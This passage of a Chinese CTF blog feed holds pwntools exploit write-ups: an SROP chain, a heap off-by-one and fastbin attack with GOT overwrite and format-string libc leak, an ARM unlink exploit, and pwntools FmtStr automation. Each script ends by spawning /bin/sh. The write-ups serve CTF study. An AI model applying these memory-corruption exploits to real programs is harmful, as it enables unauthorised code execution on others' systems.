<span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	time.sleep(<span class="number">3</span>)</div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_execve</div><div class="line">frame.rdi = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rsi = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rdx = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rsp = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rip = <span class="number">0x4000BE</span></div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line"><span class="comment"># write</span></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0x4000B3</span>)+p64(<span class="number">0x4000B0</span>)</div><div class="line">sd(payload)</div><div class="line">sd(<span class="string">"\xb3"</span>)</div><div class="line"></div><div class="line"></div><div class="line">stack_addr = u64(p.recv(<span class="number">16</span>)[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x1000</span></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line"></div><div class="line"><span class="comment"># frame </span></div><div class="line"><span class="comment"># call read into stack_addr</span></div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_read</div><div class="line">frame.rdi = <span class="number">0x0</span></div><div class="line">frame.rsi = stack_addr</div><div class="line">frame.rdx = <span class="number">0x400</span></div><div class="line">frame.rsp = stack_addr</div><div class="line">frame.rip = <span class="number">0x4000BE</span></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)</div><div class="line">payload +=p64(<span class="number">0</span>)+str(frame)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># return</span></div><div class="line">payload = p64(<span class="number">0x4000Be</span>)</div><div class="line">payload += <span class="string">"\x00"</span>*(<span class="number">15</span><span class="number">-8</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#frame</span></div><div class="line"><span class="comment"># write /bin/sh</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_execve</div><div class="line">frame.rdi = stack_addr+<span class="number">0x150</span></div><div class="line">frame.rsi = <span class="number">0x0</span></div><div class="line">frame.rdx = <span class="number">0x0</span></div><div class="line">frame.rsp = stack_addr</div><div class="line">frame.rip = <span class="number">0x4000Be</span></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)</div><div class="line">payload +=p64(<span class="number">0</span>)+str(frame)</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">0x150</span>-len(payload))+<span class="string">"/bin/sh\x00"</span></div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># return</span></div><div class="line">payload = p64(<span class="number">0x4000Be</span>)</div><div class="line">payload += <span class="string">"\x00"</span>*(<span class="number">15</span><span class="number">-8</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>用到了很多姿势啊，台湾友人的pwn很强悍，hhhhhhh。</p>
<p>参考链接：<a href="http://w0lfzhang.me/2017/04/11/2016-HITCON-CTF-babyheap/" target="_blank" rel="external">http://w0lfzhang.me/2017/04/11/2016-HITCON-CTF-babyheap/</a></p>
<p>非常坑的一点是，在ubuntu16.04下，scanf操作会在heap区域生成最少0x410大小的chunk。。。如果不知道这一点，这题是没法做的。（一定要在ubuntu16.04环境下测试该题哦~</p>
<p>步骤：</p>
<p>1、利用scanf在heap区域生成0x1000大小的chunk，在末尾伪造chunk头，注意调整合适的size。我这边调整为0x70的 chunk size</p>
<p>2、利用null字节溢出导致虚表指针最低位字节变成00字节，指向我们伪造的fake chunk<br>（注意，fake chunk是位于0x18大小的chunk之前的，<br>）</p>
<p>3、free fake chunk 在下次new的时候，我们申请同样大小的chunk，会从fastbin中拿到我们刚才伪造的fake chunk，同时可以输入内容，覆盖虚表指针，导致任意地址写。。</p>
<p>4、我们可以利用2操作覆盖掉got表，修改exit为alarm，使我们可以重复利用1、2、3函数。</p>
<p>5、修改atoi为printf（这姿势第一次），然后通过格式化字符串泄露libc</p>
<p>6、再次覆写got ，将atoi改成system就好啦。。需要注意的是，printf返回值是他显示的字符数~</p>
<p>非常nice的一题pwn，收获很大~</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># off-by-one</span></div><div class="line"><span class="comment"># fastbin attack</span></div><div class="line"><span class="comment"># overwrite got</span></div><div class="line"><span class="comment"># fmt</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-20 03:15:30</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./hiddenlove"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = ELF(target)</div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target)</div><div class="line">	<span class="comment">#gdb.attach(p,"b*0x400B48\nb*0x400A1A\nc")</span></div><div class="line">	<span class="comment">#gdb.attach(p,"b*0x4008f4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># stage 0</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"s for her?(Y/N)\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*(<span class="number">0x1000</span><span class="number">-0x20</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</div><div class="line"></div><div class="line"><span class="comment">## stage 1</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" her(0~1000)\n"</span>)</div><div class="line">sl(str(<span class="number">0x20</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"\x00"</span>*<span class="number">8</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,data)</span>:</span></div><div class="line">	<span class="comment">## stage 2</span></div><div class="line">	ru(<span class="string">"t her feet\n"</span>)</div><div class="line">	sl(<span class="string">"3"</span>)</div><div class="line"></div><div class="line">	<span class="comment">## stage 3 </span></div><div class="line">	ru(<span class="string">"t her feet\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">" her(0~1000)\n"</span>)</div><div class="line">	sl(str(<span class="number">0x60</span>))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(addr))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(<span class="string">"b"</span>)</div><div class="line"></div><div class="line"></div><div class="line">	<span class="comment"># stage 4</span></div><div class="line">	ru(<span class="string">"t her feet\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"lings\n"</span>)</div><div class="line"></div><div class="line">	sd(data)</div><div class="line"></div><div class="line"></div><div class="line">payload = p64(rop.symbols[<span class="string">"free"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"puts"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__stack_chk_fail"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"setbuf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"read"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__libc_start_main"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"malloc"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>)<span class="comment"># change atoi to printf (we can use fmt to leak address</span></div><div class="line">payload +=p64(rop.symbols[<span class="string">"__isoc99_scanf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>) <span class="comment"># change exit to alarm</span></div><div class="line"></div><div class="line"></div><div class="line">edit(rop.got[<span class="string">"free"</span>],payload)</div><div class="line"></div><div class="line"><span class="comment"># leak</span></div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(rop.got[<span class="string">"puts"</span>]))</div><div class="line">puts_addr = u64(ru(<span class="string">"..."</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="comment"># read(0,buf,0x10)</span></div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(rop.got[<span class="string">"printf"</span>]))<span class="comment"># dl_reslove change printf_got</span></div><div class="line">printf_addr = u64(ru(<span class="string">"..."</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"printf_addr="</span>+hex(printf_addr)</div><div class="line"></div><div class="line">system_addr = puts_addr-(libc.symbols[<span class="string">"puts"</span>]-libc.symbols[<span class="string">"system"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line"></div><div class="line">payload = p64(rop.symbols[<span class="string">"free"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"puts"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__stack_chk_fail"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"setbuf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"read"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__libc_start_main"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"malloc"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(system_addr)<span class="comment"># change atoi to printf (we can use fmt to leak address</span></div><div class="line">payload +=p64(rop.symbols[<span class="string">"__isoc99_scanf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>) <span class="comment"># change exit to alarm</span></div><div class="line"></div><div class="line"></div><div class="line">sd(<span class="string">"aa"</span>) <span class="comment"># I have changed atoi to printf,so it return the number of my input chars</span></div><div class="line">ru(<span class="string">"lings\n"</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment"># it's a funny pwn ~~~</span></div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[arm_double_free_attack]]></title>
      <url>/2017/04/10/arm-double-free-attack/</url>
      <content type="html"><![CDATA[<p>题目来源自 X-NUCA 2016的note题目。题目资料全都可以从我的github上下载。</p>
<p>简单的堆溢出题目，但是环境在arm上，有一些小坑，比如说0x200的chunk在这边行不通了，只能用0x100的chunk，0x200好像比变成了large chunk，果然基础弱渣在这里是无法生存的。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-09 08:34:41</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="comment"># import roputils</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./note"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,data)</span>:</span></div><div class="line">	ru(<span class="string">"6. Exit"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	<span class="comment"># raw_input()</span></div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(str(length))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"6. Exit"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"the id:"</span>)</div><div class="line">	sl(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></div><div class="line">	ru(<span class="string">"6. Exit"</span>)</div><div class="line">	sl(<span class="string">"5"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(str(index))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_anyaddr</span><span class="params">(addr,data)</span>:</span></div><div class="line">	edit(<span class="number">1</span>,p32(<span class="number">0</span>)+p32(addr))</div><div class="line">	edit(<span class="number">0</span>,data)</div><div class="line">	</div><div class="line"><span class="comment"># stage 1 unlink</span></div><div class="line">add(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x8</span>)<span class="comment">#0</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"aaa"</span>)<span class="comment">#1  &gt;=0x200会使用large chunk</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"aaa"</span>)<span class="comment">#2</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#3</span></div><div class="line">junk = <span class="string">"\x00"</span>*<span class="number">8</span></div><div class="line">head = p32(<span class="number">0</span>)*<span class="number">2</span></div><div class="line">fake_head = p32(<span class="number">0</span>)+p32(<span class="number">0x101</span>)</div><div class="line">fd = p32(<span class="number">0x1205C</span>+<span class="number">0x8</span><span class="number">-0xc</span>)</div><div class="line">bk = p32(<span class="number">0x1205C</span>+<span class="number">0x8</span><span class="number">-0x8</span>)</div><div class="line">payload  = junk+head</div><div class="line">payload += fake_head+fd+bk</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">0x100</span>-len(fake_head+fd+bk))</div><div class="line">payload += p32(<span class="number">0x100</span>)+p32(<span class="number">0x108</span>)</div><div class="line">edit(<span class="number">0</span>,payload)</div><div class="line">raw_input()</div><div class="line">dele(<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment"># stage 2 edit free_got</span></div><div class="line">edit_anyaddr(<span class="number">0x12024</span>,p32(<span class="number">0x8538</span>)[:<span class="number">-1</span>])<span class="comment">#有零字节溢出，会破坏下一个got</span></div><div class="line">dele(<span class="number">3</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap overflow </tag>
            
            <tag> arm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【pwn】 初探pwntools fmt特性]]></title>
      <url>/2017/04/09/%E5%88%9D%E6%8E%A2pwntools-fmt%E7%89%B9%E6%80%A7/</url>
      <content type="html"><![CDATA[<p>翻pwntools文档的时候突然发现了pwntools多了一个自动完成fmt漏洞利用的特性。</p>
<p>官方文档链接  <a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="external">http://pwntools.readthedocs.io/en/stable/fmtstr.html</a></p>
<p>在本地一看，pwntools还是2.x版本。。官方都已经更新到3.5版本了，于是果断更新= =。。</p>
<p>漏洞程序是这样子的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+1Ch] [bp-184h]@2</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+9Ch] [bp-104h]@2</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+11Ch] [bp-84h]@2</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+19Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  v6 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  print_welcome();</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"First input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v3);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Second input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v4);</div><div class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v5, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">44</span>);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"All is Done"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以直接看到，有两处fmt漏洞，这是个循环，我们只需要循环利用其中一个fmt漏洞就可以。</p>
<p>我们可以利用pwntools提供fmt自动利用的功能快速算出格式化字符串在栈中的偏移。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p = process(target)</div><div class="line">	p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	<span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div></pre></td></tr></table></figure>
<p>泄露出其中一个库函数地址后，利用我们本地搭建好的libc-database库算出system函数的地址。(如果出现多个匹配的话，就爆破吧:P</p>
<p>主要的还是它可以自动完成任意地址写的payload，就适合我这种深度懒癌患者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">	ru(<span class="string">"input:"</span>)</div><div class="line">	sl(payload)</div><div class="line">	ru(<span class="string">"input:"</span>)</div><div class="line">	sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line">autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">autofmt.write(printf_got,system_addr)</div><div class="line">autofmt.execute_writes()</div></pre></td></tr></table></figure>
<p>总的exp是这样子的。大概爆破三次就出结果，这还是我只泄露了一个库函数地址的情况下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div 